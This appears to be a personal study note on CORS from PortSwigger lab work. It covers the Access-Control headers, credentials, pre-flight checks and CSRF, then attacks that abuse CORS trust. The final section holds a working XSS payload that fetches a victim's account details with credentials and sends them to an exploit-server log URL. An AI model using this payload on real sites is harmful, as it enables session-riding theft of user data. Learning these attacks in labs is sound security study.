---
tags:
  - cors
  - sop
---
[[SOP]]
[[ Cross-Origin Resource Sharing (CORS) Complete Guide  RaniaKhalil]]
[[LabsSolved]]

### CORS and the Access-Control-Allow-Origin Response Header

#### What is CORS?

- Cross-Origin Resource Sharing (CORS) is a specification that allows controlled relaxation of the same-origin policy.
- It permits HTTP requests from one domain to another through the use of specific HTTP headers.
- Browsers use these headers to permit or deny access to responses of cross-origin requests.

#### Access-Control-Allow-Origin Response Header

- This header is included in a response to identify the permitted origin of a request.
- A browser compares this header with the requesting website's origin and permits access if they match.

**Example:**

- Request from `normal-website.com` to `robust-website.com`:
    
    http
    

- `GET /data HTTP/1.1 Host: robust-website.com Origin: https://normal-website.com`
    
- Response from `robust-website.com`:
    
    http
    

- `HTTP/1.1 200 OK Access-Control-Allow-Origin: https://normal-website.com`
    
- Browser allows code from `normal-website.com` to access the response.

#### Implementing Simple Cross-Origin Resource Sharing

- CORS uses specific headers to restrict origins for web resource requests.
- **Key Header:** `Access-Control-Allow-Origin`
- **Example Values:**
    - Single Origin: `Access-Control-Allow-Origin: https://normal-website.com`
    - Wildcard: `Access-Control-Allow-Origin: *` (restricts credentials usage)

#### Handling Cross-Origin Requests with Credentials

- By default, cross-origin requests exclude credentials like cookies and authorization headers.
- To include credentials:
    - Request:
        
        http
        

- `GET /data HTTP/1.1 Host: robust-website.com Origin: https://normal-website.com Cookie: JSESSIONID=<value>`
    
- Response:
    
    http
    

- - `HTTP/1.1 200 OK Access-Control-Allow-Origin: https://normal-website.com Access-Control-Allow-Credentials: true`
        
- **Note:** Wildcards (*) cannot be used with `Access-Control-Allow-Credentials`.

#### Relaxation of CORS with Wildcards

- **Allowed:** `Access-Control-Allow-Origin: *`
- **Not Allowed:** `Access-Control-Allow-Origin: https://*.normal-website.com`
- **Security Restriction:** Cannot combine `*` with `Access-Control-Allow-Credentials: true`.

#### Dynamic Creation of Access-Control-Allow-Origin

- Some servers dynamically generate the `Access-Control-Allow-Origin` header based on the client's origin.
- This approach can be insecure and prone to exploitation.

#### Pre-Flight Checks

- Pre-flight checks protect legacy resources from expanded request options allowed by CORS.
- Triggered for non-standard HTTP methods or headers.
- **Pre-flight Request Example:**
    
    http
    

- `OPTIONS /data HTTP/1.1 Host: robust-website.com Origin: https://normal-website.com Access-Control-Request-Method: PUT Access-Control-Request-Headers: Special-Request-Header`
    
- **Pre-flight Response Example:**
    
    http
    

- `HTTP/1.1 204 No Content Access-Control-Allow-Origin: https://normal-website.com Access-Control-Allow-Methods: PUT, POST, OPTIONS Access-Control-Allow-Headers: Special-Request-Header Access-Control-Allow-Credentials: true Access-Control-Max-Age: 240`
    
- This response allows the methods and headers specified and permits credentials. `Access-Control-Max-Age` defines how long the pre-flight response can be cached.

#### CORS and CSRF

- **CORS does not protect against CSRF** (Cross-Site Request Forgery) attacks.
- Misconfigured CORS can increase CSRF risks.
- CSRF attacks can occur via HTML forms or cross-domain resource includes without using CORS.

### Summary

- **CORS** relaxes the same-origin policy under controlled conditions using HTTP headers.
- **Key Header:** `Access-Control-Allow-Origin`
- **Credentials:** Use `Access-Control-Allow-Credentials` to include credentials.
- **Wildcards:** Limited usage to maintain security.
- **Pre-Flight Checks:** Ensure non-standard requests are safe.
- **CSRF Protection:** CORS is not a defense mechanism against CSRF.

# Exploiting XSS VIA CORS trust relationships 
- Attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information .
- Given the following request:

`GET /api/requestApiKey HTTP/1.1 Host: vulnerable-website.com Origin: https://subdomain.vulnerable-website.com Cookie: sessionid=...`

If the server responds with:

`HTTP/1.1 200 OK Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com Access-Control-Allow-Credentials: true`

Then an attacker who finds an XSS vulnerability on `subdomain.vulnerable-website.com` could use that to retrieve the API key, using a URL like:

`https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`
Like doing something with the api-key but using JS at the targets pc. 
#  Breaking TLS with poorly configured CORS
- If CORS mechanism accepts https and HTTP  then : 
	- 

```javascript
<script> document.location="http://stock.0ac2003903304cfc805b7bc100fd00ed.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0ac2003903304cfc805b7bc100fd00ed.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a5900d203994c8d80617a3d018d0098.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>
```